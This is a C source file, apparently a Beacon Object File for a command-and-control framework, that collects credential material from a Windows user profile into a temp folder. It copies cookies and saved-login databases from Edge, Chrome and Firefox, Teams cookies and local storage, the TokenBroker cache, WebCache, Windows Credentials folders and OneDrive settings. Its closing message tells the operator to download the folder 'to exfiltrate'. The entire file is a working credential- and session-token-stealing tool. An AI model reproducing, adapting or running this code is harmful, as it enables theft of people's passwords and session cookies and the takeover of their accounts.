#include <windows.h>
#include "bofdefs.h"
#include "base.c"

WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR lpFileName);
WINBASEAPI DWORD WINAPI KERNEL32$ExpandEnvironmentStringsA(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);
WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryA(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
WINBASEAPI BOOL WINAPI KERNEL32$CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
WINBASEAPI char* __cdecl MSVCRT$strncpy(char* dest, const char* src, size_t count);

BOOL FileExistsA(const char* path)
{
    DWORD attr = KERNEL32$GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL DirExistsA(const char* path)
{
    DWORD attr = KERNEL32$GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
}

void ExpandPath(const char* src, char* dst, DWORD dstSize)
{
    if (KERNEL32$ExpandEnvironmentStringsA(src, dst, dstSize) == 0) {
        MSVCRT$strncpy(dst, src, dstSize - 1);
        dst[dstSize - 1] = '\0';
    }
}

BOOL StageFile(const char* src, const char* dst)
{
    if (!FileExistsA(src)) return FALSE;
    if (KERNEL32$CopyFileA(src, dst, FALSE)) {
        internal_printf("    [+] Staged: %s\n", dst);
        return TRUE;
    }
    return FALSE;
}

void StageDirectoryContents(const char* srcDir, const char* dstDir)
{
    if (!DirExistsA(srcDir)) return;
    KERNEL32$CreateDirectoryA(dstDir, NULL);

    char searchPath[260];
    MSVCRT$sprintf(searchPath, "%s\\*", srcDir);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (MSVCRT$strcmp(fd.cFileName, ".") == 0 || MSVCRT$strcmp(fd.cFileName, "..") == 0)
            continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        char srcFile[260], dstFile[260];
        MSVCRT$sprintf(srcFile, "%s\\%s", srcDir, fd.cFileName);
        MSVCRT$sprintf(dstFile, "%s\\%s", dstDir, fd.cFileName);
        StageFile(srcFile, dstFile);
    } while (KERNEL32$FindNextFileA(hFind, &fd));
    KERNEL32$FindClose(hFind);
}

void StageBrowser(const char* userDataPath, const char* stageRoot, const char* browserName)
{
    if (!DirExistsA(userDataPath)) return;
    internal_printf("[%s]\n", browserName);

    char defProfile[260];
    MSVCRT$sprintf(defProfile, "%s\\Default", userDataPath);
    if (DirExistsA(defProfile)) {
        char dstDir[260];
        MSVCRT$sprintf(dstDir, "%s\\%s_Default", stageRoot, browserName);
        KERNEL32$CreateDirectoryA(dstDir, NULL);

        char src[260], dst[260];
        MSVCRT$sprintf(src, "%s\\Network\\Cookies", defProfile);
        MSVCRT$sprintf(dst, "%s\\Network_Cookies", dstDir);
        StageFile(src, dst);

        MSVCRT$sprintf(src, "%s\\Login Data", defProfile);
        MSVCRT$sprintf(dst, "%s\\Login_Data", dstDir);
        StageFile(src, dst);
    }

    char searchPath[260];
    MSVCRT$sprintf(searchPath, "%s\\Profile *", userDataPath);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                char profilePath[260];
                MSVCRT$sprintf(profilePath, "%s\\%s", userDataPath, fd.cFileName);
                char dstDir[260];
                MSVCRT$sprintf(dstDir, "%s\\%s_%s", stageRoot, browserName, fd.cFileName);
                KERNEL32$CreateDirectoryA(dstDir, NULL);

                char src[260], dst[260];
                MSVCRT$sprintf(src, "%s\\Network\\Cookies", profilePath);
                MSVCRT$sprintf(dst, "%s\\Network_Cookies", dstDir);
                StageFile(src, dst);

                MSVCRT$sprintf(src, "%s\\Login Data", profilePath);
                MSVCRT$sprintf(dst, "%s\\Login_Data", dstDir);
                StageFile(src, dst);
            }
        } while (KERNEL32$FindNextFileA(hFind, &fd));
        KERNEL32$FindClose(hFind);
    }
}

void StageTeamsOld(const char* stageRoot, const char* appData)
{
    char teamsDir[260];
    MSVCRT$sprintf(teamsDir, "%s\\Microsoft\\Teams", appData);
    if (!DirExistsA(teamsDir)) return;
    internal_printf("[Teams Old]\n");

    char src[260], dst[260];
    MSVCRT$sprintf(dst, "%s\\Teams_Network", stageRoot);
    KERNEL32$CreateDirectoryA(dst, NULL);
    MSVCRT$sprintf(src, "%s\\Network\\Cookies", teamsDir);
    MSVCRT$sprintf(dst, "%s\\Teams_Network\\Cookies", stageRoot);
    StageFile(src, dst);

    MSVCRT$sprintf(dst, "%s\\Teams_LocalStorage", stageRoot);
    MSVCRT$sprintf(src, "%s\\Local Storage\\leveldb", teamsDir);
    StageDirectoryContents(src, dst);

    MSVCRT$sprintf(dst, "%s\\Teams_IndexedDB", stageRoot);
    MSVCRT$sprintf(src, "%s\\IndexedDB", teamsDir);
    StageDirectoryContents(src, dst);

    MSVCRT$sprintf(src, "%s\\Login Data", teamsDir);
    MSVCRT$sprintf(dst, "%s\\Teams_LoginData", stageRoot);
    StageFile(src, dst);
}

void StageTeamsNew(const char* stageRoot, const char* localAppData)
{
    char newTeams[260];
    MSVCRT$sprintf(newTeams, "%s\\Packages\\MSTeams_8wekyb3d8bbwe\\LocalCache\\Microsoft\\MSTeams", localAppData);
    if (!DirExistsA(newTeams)) return;
    internal_printf("[Teams New (UWP)]\n");

    char src[260], dst[260];
    MSVCRT$sprintf(dst, "%s\\TeamsNew_Network", stageRoot);
    KERNEL32$CreateDirectoryA(dst, NULL);
    MSVCRT$sprintf(src, "%s\\Network\\Cookies", newTeams);
    MSVCRT$sprintf(dst, "%s\\TeamsNew_Network\\Cookies", stageRoot);
    StageFile(src, dst);

    MSVCRT$sprintf(dst, "%s\\TeamsNew_LocalStorage", stageRoot);
    MSVCRT$sprintf(src, "%s\\Local Storage\\leveldb", newTeams);
    StageDirectoryContents(src, dst);
}

void StageFirefox(const char* stageRoot, const char* appData)
{
    char ffProfiles[260];
    MSVCRT$sprintf(ffProfiles, "%s\\Mozilla\\Firefox\\Profiles", appData);
    if (!DirExistsA(ffProfiles)) return;
    internal_printf("[Firefox]\n");

    char searchPath[260];
    MSVCRT$sprintf(searchPath, "%s\\*", ffProfiles);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (MSVCRT$strcmp(fd.cFileName, ".") == 0 || MSVCRT$strcmp(fd.cFileName, "..") == 0) continue;
            char src[260], dst[260];
            MSVCRT$sprintf(src, "%s\\%s\\cookies.sqlite", ffProfiles, fd.cFileName);
            MSVCRT$sprintf(dst, "%s\\Firefox_%s\\cookies.sqlite", stageRoot, fd.cFileName);
            KERNEL32$CreateDirectoryA(dst, NULL); // create parent? No, CreateDirectory on file path fails. Need dir path.
            // fix: create dir first
            char dstDir[260];
            MSVCRT$sprintf(dstDir, "%s\\Firefox_%s", stageRoot, fd.cFileName);
            KERNEL32$CreateDirectoryA(dstDir, NULL);
            MSVCRT$sprintf(dst, "%s\\cookies.sqlite", dstDir);
            StageFile(src, dst);
        }
    } while (KERNEL32$FindNextFileA(hFind, &fd));
    KERNEL32$FindClose(hFind);
}

void StageTokenBroker(const char* stageRoot, const char* localAppData)
{
    char tbDir[260];
    MSVCRT$sprintf(tbDir, "%s\\Microsoft\\TokenBroker\\Cache", localAppData);
    if (!DirExistsA(tbDir)) return;
    internal_printf("[TokenBroker Cache]\n");
    char dstDir[260];
    MSVCRT$sprintf(dstDir, "%s\\TokenBroker_Cache", stageRoot);
    StageDirectoryContents(tbDir, dstDir);
}

void StageWebCache(const char* stageRoot, const char* localAppData)
{
    char src[260], dst[260];
    MSVCRT$sprintf(src, "%s\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat", localAppData);
    if (!FileExistsA(src)) return;
    internal_printf("[WebCache]\n");
    MSVCRT$sprintf(dst, "%s\\WebCacheV01.dat", stageRoot);
    StageFile(src, dst);
}

void StageCredentials(const char* stageRoot, const char* localAppData, const char* appData)
{
    char src[260], dst[260];

    MSVCRT$sprintf(src, "%s\\Microsoft\\Credentials", localAppData);
    if (DirExistsA(src)) {
        internal_printf("[Credentials Local]\n");
        MSVCRT$sprintf(dst, "%s\\Credentials_Local", stageRoot);
        StageDirectoryContents(src, dst);
    }

    MSVCRT$sprintf(src, "%s\\Microsoft\\Credentials", appData);
    if (DirExistsA(src)) {
        internal_printf("[Credentials Roaming]\n");
        MSVCRT$sprintf(dst, "%s\\Credentials_Roaming", stageRoot);
        StageDirectoryContents(src, dst);
    }
}

void StageOneDriveSettings(const char* stageRoot, const char* localAppData)
{
    char src[260], dst[260];

    MSVCRT$sprintf(src, "%s\\Microsoft\\OneDrive\\settings\\Business1", localAppData);
    if (DirExistsA(src)) {
        internal_printf("[OneDrive Business Settings]\n");
        MSVCRT$sprintf(dst, "%s\\OneDrive_Business1", stageRoot);
        StageDirectoryContents(src, dst);
    }

    MSVCRT$sprintf(src, "%s\\Microsoft\\OneDrive\\settings\\Personal", localAppData);
    if (DirExistsA(src)) {
        internal_printf("[OneDrive Personal Settings]\n");
        MSVCRT$sprintf(dst, "%s\\OneDrive_Personal", stageRoot);
        StageDirectoryContents(src, dst);
    }
}

void RunCloudTokenStage()
{
    char tempPath[260] = {0};
    ExpandPath("%TEMP%", tempPath, 260);
    char stageRoot[260];
    MSVCRT$sprintf(stageRoot, "%s\\CloudTokenStage", tempPath);
    KERNEL32$CreateDirectoryA(stageRoot, NULL);

    internal_printf("[*] Staging cloud tokens to: %s\n\n", stageRoot);

    char appData[260] = {0};
    char localAppData[260] = {0};
    ExpandPath("%APPDATA%", appData, 260);
    ExpandPath("%LOCALAPPDATA%", localAppData, 260);

    StageTeamsOld(stageRoot, appData);
    StageTeamsNew(stageRoot, localAppData);

    char edgePath[260];
    MSVCRT$sprintf(edgePath, "%s\\Microsoft\\Edge\\User Data", localAppData);
    StageBrowser(edgePath, stageRoot, "Edge");

    char chromePath[260];
    MSVCRT$sprintf(chromePath, "%s\\Google\\Chrome\\User Data", localAppData);
    StageBrowser(chromePath, stageRoot, "Chrome");

    StageFirefox(stageRoot, appData);
    StageTokenBroker(stageRoot, localAppData);
    StageWebCache(stageRoot, localAppData);
    StageCredentials(stageRoot, localAppData, appData);
    StageOneDriveSettings(stageRoot, localAppData);

    internal_printf("\n[*] Staging complete. Use 'download' on %s to exfiltrate.\n", stageRoot);
}

#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    if (!bofstart()) return;
    RunCloudTokenStage();
    printoutput(TRUE);
}
#else
int main()
{
    RunCloudTokenStage();
    return 0;
}
#endif
